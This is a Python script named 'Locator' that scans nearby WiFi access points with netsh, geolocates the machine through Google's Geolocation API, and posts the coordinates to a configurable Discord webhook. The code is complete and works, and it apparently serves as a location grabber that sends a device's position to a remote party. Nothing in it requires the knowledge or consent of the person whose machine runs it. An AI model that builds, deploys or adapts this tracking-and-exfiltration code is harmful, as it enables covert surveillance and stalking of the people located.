# Copyright (c) Locator (https://github.com/BugHunter34/Locator)
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - If there is an error, please contact the owner.
#     - Do not resell this tool, do not credit it to yours.
# CZ: 
#     - Pokud je zde chyba, prosím kontaktujte majitele.
#     - Nerozprodávejte tento nástroj, nepřivlastňujte si ho.

import requests
import subprocess
import json
import re

# setting
# Please insert your Google API key with geolocation enabled
GOOGLE_API_KEY = "XXX"  

# Please insert your discord webhook to which the program will send output
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/....."



def get_bssids():
    try:
#   if known insert here and comment bssids in line 39
#   (insert at least 4-5 for it to work)s
#        bssids = [
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"},
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"},
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"},
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"},
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"},
#                    {"macAddress": "xx:xx:xx:xx:xx:xx"}
#                ]
        result = subprocess.run(["netsh", "wlan", "show", "network", "mode=bssid"], capture_output=True, text=True)
        bssid_pattern = r'BSSID \d+ *: ([0-9a-fA-F:]{17})'
        bssids_found = re.findall(bssid_pattern, result.stdout)
        bssids = [{"macAddress": mac.lower()} for mac in bssids_found]
        return bssids
    except Exception as e:
        print(f"Error while getting BSSIDs {e}")
        return []

#POST Google Geolocation API
def get_location(bssids):
    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
    payload = {"wifiAccessPoints": bssids}
    try:
        response = requests.post(url, json=payload)
        data = response.json()
        if "location" in data:
            return data["location"]["lat"], data["location"]["lng"], data.get("accuracy", "Unknown")
        else:
            print("Error while locating:", data)
            return None, None, None
    except Exception as e:
        print(f"Error while requesting API: {e}")
        return None, None, None

# Discord webhook
def send_to_discord(lat, lng, accuracy):
    message = f"🌍 **WiFi Geolocation**\n📍 **Coordinates:** {lat}, {lng}\n📏 **Accuracy:** ±{accuracy}m"
    payload = {"content": message}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        print("Succesfully posted on Discord!")
    except Exception as e:
        print(f"Error while posting on Discord: {e}")

# RUN script
if __name__ == "__main__":
    print("searching for BSSID")
    bssids = get_bssids()
    if not bssids:
        print("error, no BSSID founded!")
    else:
        print(f"📡 Founded {len(bssids)} WiFi access points")
        print('\n'.join(f'{{"macAddress": "{entry["macAddress"]}"}}' for entry in bssids))
        lat, lng, accuracy = get_location(bssids)
        if lat and lng:
            print(f"📍 coordinates: {lat}, {lng} (±{accuracy}m)")
            send_to_discord(lat, lng, accuracy)
        else:
            print("Failed to get location!")


#  ____                                 _ _                 
# |  _ \         _      /\             | | |                
# | |_) |_   _  (_)    /  \   _ __   __| | |__  _   _ _   _ 
# |  _ <| | | |       / /\ \ | '_ \ / _` | '_ \| | | | | | |
# | |_) | |_| |  _   / ____ \| | | | (_| | | | | |_| | |_| |
# |____/ \__, | (_) /_/    \_\_| |_|\__,_|_| |_|\__, |\__, |
#         __/ |                                  __/ | __/ |
#        |___/                                  |___/ |___/ 